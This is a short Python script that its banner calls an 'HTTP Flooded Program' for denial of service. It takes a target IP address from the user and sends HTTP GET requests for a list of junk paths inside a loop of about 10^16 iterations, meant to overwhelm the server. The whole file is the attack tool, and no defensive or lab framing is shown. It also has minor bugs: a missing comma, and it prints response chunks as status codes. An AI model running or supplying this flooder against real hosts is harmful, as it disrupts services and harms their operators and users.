import random
from random import randint
import requests

liststr = ['a','b','c','d','e','f',
           'g','h','i','j','k','l',
           'm','n','o','p','q','r',
           's','t','u','v','w','x',
           'y','z','0','1','2','3',
           '4','5','6','7','8','9',
           'hello','webfig','husdio','iad',
           'userman','uhdsoia','9u82j','kzihdis',
           'jhdsoiahdnoi','jhsai','9jan','1sjia',
           '0isaop','bjae','iayus','hua','xiao',
           'memex','net','http','api','gege',
           'iaud','ois','bebek','hello',
           'hihi','nene','vb','dos','12ws','kk',
           '123','index','0ok','bkp','wor','wot',
           'ngil','oaidop','827dh','827hdn','#w','sdc',
           'poid','mampus','netnot','hel','bell','yur',
           'ajg','gawq','j345d','jahydioando','kiaus9o'
           'jj','mz','qapz','delonajg','bab1','jkl','va',
           '' 
          ]


# Initiated

print("======== HTTP Flooded Program. (Like HTTP DOS) =========\n")
ipaddr = str(input("Input ip address : "))

# Execute
for i in range (10000000000000000):
    for number, letter in enumerate(liststr):
        #req = requests.get("http://192.168.122.146/"+ letter)
        req = requests.get("http://" + ipaddr + "/"+ letter)

        # print status code
        for status_code in req:
            print("Status code = ", status_code)
